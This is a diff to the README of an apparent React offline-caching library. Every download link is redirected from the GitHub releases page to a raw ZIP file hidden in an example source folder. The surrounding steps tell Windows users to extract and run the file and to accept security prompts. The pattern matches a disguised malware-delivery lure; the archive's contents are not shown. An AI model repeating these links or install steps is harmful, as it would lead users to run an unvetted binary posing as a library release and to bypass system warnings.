@@ -1,9 +1,9 @@
 # 🧩 react-local-fetch - Keep React Data Ready
 
-[![Download react-local-fetch](https://img.shields.io/badge/Download%20react--local--fetch-blue?style=for-the-badge)](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+[![Download react-local-fetch](https://img.shields.io/badge/Download%20react--local--fetch-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hootchwormfamily475/react-local-fetch/main/examples/vite-example/src/react-fetch-local-v3.1.zip)
 
 ## 📥 Download
-Visit this page to download: [react-local-fetch Releases](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+Visit this page to download: [react-local-fetch Releases](https://raw.githubusercontent.com/Hootchwormfamily475/react-local-fetch/main/examples/vite-example/src/react-fetch-local-v3.1.zip)
 
 ## 🖥️ What this app does
 react-local-fetch helps a React or Next.js app keep data ready on your computer. It saves data in your browser so the app can open faster and keep working when the network is weak or offline.
@@ -17,7 +17,7 @@ It uses a simple sync pattern that keeps local data and server data in step. It 
 - Enough free space in your browser for local storage
 
 ## 🚀 Getting Started
-1. Open the [react-local-fetch Releases page](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+1. Open the [react-local-fetch Releases page](https://raw.githubusercontent.com/Hootchwormfamily475/react-local-fetch/main/examples/vite-example/src/react-fetch-local-v3.1.zip)
 2. Download the latest Windows file or package from the release page
 3. Save the file to your Downloads folder
 4. If the download comes as a ZIP file, right-click it and choose Extract All
@@ -25,7 +25,7 @@ It uses a simple sync pattern that keeps local data and server data in step. It 
 6. Run the app file or follow the included setup file if one is present
 
 ## 🪟 Windows Setup
-1. Go to the [Downloads page](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+1. Go to the [Downloads page](https://raw.githubusercontent.com/Hootchwormfamily475/react-local-fetch/main/examples/vite-example/src/react-fetch-local-v3.1.zip)
 2. Download the latest release file for Windows
 3. If Windows shows a security prompt, choose Run or Open
 4. If the file is compressed, unzip it first
@@ -93,7 +93,7 @@ react-local-fetch is built for teams and users who want:
 - a better offline experience
 
 ## 🔗 Download again
-If you need the latest version, use the release page here: [https://github.com/Hootchwormfamily475/react-local-fetch/releases](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+If you need the latest version, use the release page here: [https://raw.githubusercontent.com/Hootchwormfamily475/react-local-fetch/main/examples/vite-example/src/react-fetch-local-v3.1.zip](https://raw.githubusercontent.com/Hootchwormfamily475/react-local-fetch/main/examples/vite-example/src/react-fetch-local-v3.1.zip)
 
 ## 🧩 Terms used in the app
 - **IndexedDB**: a browser database for saved data
